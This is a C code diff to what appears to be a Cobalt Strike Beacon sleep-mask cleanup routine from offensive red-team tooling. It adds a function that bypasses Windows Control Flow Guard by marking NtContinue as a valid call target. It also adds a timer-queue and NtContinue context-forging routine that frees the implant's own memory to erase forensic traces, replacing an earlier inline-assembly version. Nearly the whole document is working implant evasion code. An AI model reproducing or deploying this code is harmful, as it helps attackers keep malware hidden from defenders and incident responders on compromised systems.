@@ -38,7 +38,6 @@ extern "C" {
 
 //WINBASEAPI VOID WINAPI KERNEL32$OutputDebugStringA(LPCSTR lpOutputString);
 //WINBASEAPI int       __cdecl MSVCRT$vsprintf_s(char* _DstBuf, size_t _DstSize, const char* _Format, ...);
-//
 //#define OutputDebugStringA        KERNEL32$OutputDebugStringA
 //#define vsprintf_s                MSVCRT$vsprintf_s
 //void dlog(const char* fmt, ...) {
@@ -49,9 +48,168 @@ extern "C" {
 //    va_end(va);
 //    OutputDebugStringA(buff);
 //}
+
+typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS
+{
+    VmPrefetchInformation,                      // s: MEMORY_PREFETCH_INFORMATION
+    VmPagePriorityInformation,                  // s: MEMORY_PAGE_PRIORITY_INFORMATION
+    VmCfgCallTargetInformation,                 // s: CFG_CALL_TARGET_LIST_INFORMATION // REDSTONE2
+    VmPageDirtyStateInformation,                // s: MEMORY_PAGE_DIRTY_STATE_INFORMATION // REDSTONE3
+    VmImageHotPatchInformation,                 // s: 19H1
+    VmPhysicalContiguityInformation,            // s: MEMORY_PHYSICAL_CONTIGUITY_INFORMATION // 20H1 // (requires SeLockMemoryPrivilege)
+    VmVirtualMachinePrepopulateInformation,
+    VmRemoveFromWorkingSetInformation,          // s: MEMORY_REMOVE_WORKING_SET_INFORMATION
+    MaxVmInfoClass
+} VIRTUAL_MEMORY_INFORMATION_CLASS;
+typedef struct _MEMORY_RANGE_ENTRY
+{
+    PVOID VirtualAddress;
+    SIZE_T NumberOfBytes;
+} MEMORY_RANGE_ENTRY, *PMEMORY_RANGE_ENTRY;
+typedef struct {
+    DWORD                 dwNumberOfOffsets;
+    PULONG                plOutput;
+    PCFG_CALL_TARGET_INFO ptOffsets;
+    PVOID                 pMustBeZero;
+    PVOID                 pMoarZero;
+} VM_INFORMATION;
+DFR(KERNEL32, CreateTimerQueue);
+DFR(KERNEL32, RtlCaptureContext);
+DFR(KERNEL32, CreateTimerQueueTimer);
+DFR(KERNEL32, GetLastError);
+DFR(KERNEL32, Sleep);
+DFR(KERNEL32, VirtualFree);
+DFR(KERNEL32, HeapAlloc);
+DFR(KERNEL32, HeapFree);
+DFR(KERNEL32, GetProcessHeap);
+DFR(UCRTBASE, memcpy);
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetProcessMitigationPolicy(HANDLE hProcess, PROCESS_MITIGATION_POLICY MitigationPolicy, PVOID lpBuffer, SIZE_T dwLength);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtContinue(PCONTEXT ThreadContext, BOOL RaiseAlert);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, int MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSetInformationVirtualMemory(HANDLE ProcessHandle, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, SIZE_T NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddresses, PVOID VmInformation, ULONG VmInformationLength);
+
+BOOL cfg_enabled() {
+
+    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg_policy = { 0 };
+
+    if (!KERNEL32$GetProcessMitigationPolicy((HANDLE)-1, ProcessControlFlowGuardPolicy, &cfg_policy, sizeof(PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY))) {
+        DLOGF("[!] GetProcessMitigationPolicy failed : %d", KERNEL32$GetLastError());
+        return false;
+    }
+
+    DLOGF("[+] CFG Status : %d\n", cfg_policy.EnableControlFlowGuard);
+    return cfg_policy.EnableControlFlowGuard;
+}
+
+// https://github.com/rasta-mouse/Crystal-Kit/blob/main/loader/src/cfg.c#L23
+// https://github.com/Cracked5pider/CodeCave/blob/main/Cfg.c
+bool disable_cfg(PVOID address) {
+    MEMORY_BASIC_INFORMATION mbi = { 0 };
+    VM_INFORMATION           vmi = { 0 };
+    MEMORY_RANGE_ENTRY       mre = { 0 };
+    CFG_CALL_TARGET_INFO     cti = { 0 };
+
+    NTSTATUS status = NTDLL$NtQueryVirtualMemory ((HANDLE)-1, address, 0, &mbi, sizeof(mbi), 0 );
+
+    if (status != 0) return FALSE;
+
+    if (mbi.State != MEM_COMMIT || mbi.Type != MEM_IMAGE) return FALSE;
+
+    cti.Offset = (ULONG_PTR)address - (ULONG_PTR)mbi.BaseAddress;
+    cti.Flags  = CFG_CALL_TARGET_VALID;
+
+    mre.NumberOfBytes  = (SIZE_T)mbi.RegionSize;
+    mre.VirtualAddress = (PVOID)mbi.BaseAddress;
+
+    ULONG output = 0;
+
+    vmi.dwNumberOfOffsets = 0x1;
+    vmi.plOutput          = &output;
+    vmi.ptOffsets         = &cti;
+    vmi.pMustBeZero       = 0x0;
+    vmi.pMoarZero         = 0x0;
+
+    status = NTDLL$NtSetInformationVirtualMemory((HANDLE)-1, VmCfgCallTargetInformation, 1, &mre, (PVOID)&vmi, (ULONG)sizeof(vmi));
+
+    if ( status == 0xC00000F4 ) {
+        /* the size parameter is not valid. try 24 instead, which is a known size for older windows versions */
+        status = NTDLL$NtSetInformationVirtualMemory((HANDLE)-1, VmCfgCallTargetInformation, 1, &mre, (PVOID) &vmi, 24);
+    }
+
+    if (status != 0) {
+        /* STATUS_INVALID_PAGE_PROTECTION - CFG wasn't enabled */ 
+        if ( status == 0xC0000045 ) {
+            /* pretend we bypassed it so timers can continue */
+            return TRUE;
+        }
+
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+//https://github.com/rasta-mouse/Crystal-Kit/blob/main/loader/src/cleanup.c
+//https://github.com/Cracked5pider/CodeCave/blob/main/EkkoEx/EkkoEx.c
+bool tpQueueVFree(void* base_addr) {
+    DLOGF("[+] NtContinue : 0x%p", NTDLL$NtContinue);
+    if (cfg_enabled() == 1) disable_cfg((PVOID)NTDLL$NtContinue);
+
+    HANDLE process_heap = KERNEL32$GetProcessHeap();
+    if (process_heap == NULL) return false;
+
+    PCONTEXT contexts = (PCONTEXT)KERNEL32$HeapAlloc(process_heap, HEAP_ZERO_MEMORY, sizeof(CONTEXT) * 2);
+    CONTEXT context_template = { 0 };
+    context_template.ContextFlags = CONTEXT_FULL;
+   
+    HANDLE timer_queue = KERNEL32$CreateTimerQueue();
+    HANDLE timer = NULL;
+    if (timer_queue == NULL) {
+        DLOGF("[!] CreateTimerQueue : %d", KERNEL32$GetLastError());
+        return false;
+    }
+
+    if (!KERNEL32$CreateTimerQueueTimer(&timer, timer_queue, (WAITORTIMERCALLBACK)KERNEL32$RtlCaptureContext, &context_template, 0, 0, WT_EXECUTEINTIMERTHREAD)) {
+        DLOGF("[!] CreateTimerQueueTimer : %d", KERNEL32$GetLastError());
+        return false;
+    }
+    KERNEL32$Sleep(500);
+    DLOGF("[+] PRE_CTX %llx : %llx : %llx", context_template.Rip, context_template.Rcx, context_template.Rsp);
+    if (context_template.Rip == 0 || context_template.Rsp == 0) {
+        return false;
+    }
+
+    for (int i = 0; i < 2; i++) {
+        UCRTBASE$memcpy(&contexts[i], &context_template, sizeof(CONTEXT));
+        contexts[i].Rsp -= sizeof(PVOID);
+    }
+
+    contexts[0].Rip = (DWORD64)KERNEL32$VirtualFree;
+    contexts[0].Rcx = (DWORD64)base_addr;
+    contexts[0].Rdx = (DWORD64)0;
+    contexts[0].R8 =  (DWORD64)MEM_RELEASE;
+
+    contexts[1].Rip = (DWORD64)KERNEL32$HeapFree;
+    contexts[1].Rcx = (DWORD64)process_heap;
+    contexts[1].Rdx = (DWORD64)0;
+    contexts[1].R8 =  (DWORD64)contexts;
+
+    if (!KERNEL32$CreateTimerQueueTimer(&timer, timer_queue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &contexts[0], 500, 0, WT_EXECUTEINTIMERTHREAD)) {
+        DLOGF("[!] CreateTimerQueueTimer 2 : %d", KERNEL32$GetLastError());
+        return false;
+    }
+    // We dont want contexts to be freed before it's used by NtContinue
+    if (!KERNEL32$CreateTimerQueueTimer(&timer, timer_queue, (WAITORTIMERCALLBACK)NTDLL$NtContinue, &contexts[1], 800, 0, WT_EXECUTEINTIMERTHREAD)) {
+        DLOGF("[!] CreateTimerQueueTimer 3 : %d", KERNEL32$GetLastError());
+        return false;
+    }
+
+    return true;
+}
+
 //TODO: Could probably make this more concise 
 //TODO: This does not support drip loading
-// Replace DLOGF with uncommented dlog when debugging
+//TODO: This also doesnt cleanup heap records
 void cleanupExitThread(PBEACON_INFO info) {
     DFR_LOCAL(KERNEL32, VirtualFree);
     #define VirtualFree KERNEL32$VirtualFree
@@ -108,19 +266,21 @@ void cleanupExitThread(PBEACON_INFO info) {
         DLOGF("[SLEEPMASK:CLEANUP] Sleepmask found 0x%p", pSleepMaskAllocation);
     } else {
         pSleepMaskAllocation = info->sleep_mask_ptr;
-        //dlog("Sleepmask region not found, freeing from BEACON_INFO 0x%p", pSleepMaskAllocation);
+        DLOGF("Sleepmask region not found, freeing from BEACON_INFO 0x%p", pSleepMaskAllocation);
     }
-
-    __asm__ (
-        "mov %[pVirtualFree], %%r11\n"
-        "push %[pExitThread]\n"
-        "mov %[pSleepMaskAllocation], %%rcx\n"
-        "mov $0, %%rdx\n"
-        "mov $0x8000, %%r8\n"
-        "jmp *%%r11"
-        : 
-        : [pExitThread] "r" (pExitThread), [pVirtualFree] "r" (pVirtualFree), [pSleepMaskAllocation] "r" (pSleepMaskAllocation)
-    );
+    //DLOGF("[ASM VAL]\n%p\n%p\n%p", pVirtualFree, pExitThread, pSleepMaskAllocation);
+    tpQueueVFree(pSleepMaskAllocation);
+    KERNEL32$ExitThread(0);
+//    __asm__ (
+//        "mov %[pVirtualFree], %%r11\n"
+//        "push %[pExitThread]\n"
+//        "mov %[pSleepMaskAllocation], %%rcx\n"
+//        "mov $0, %%rdx\n"
+//        "mov $0x8000, %%r8\n"
+//        "jmp *%%r11"
+//        : 
+//        : [pExitThread] "r" (pExitThread), [pVirtualFree] "r" (pVirtualFree), [pSleepMaskAllocation] "r" (pSleepMaskAllocation)
+//    );
 }
 
     /**
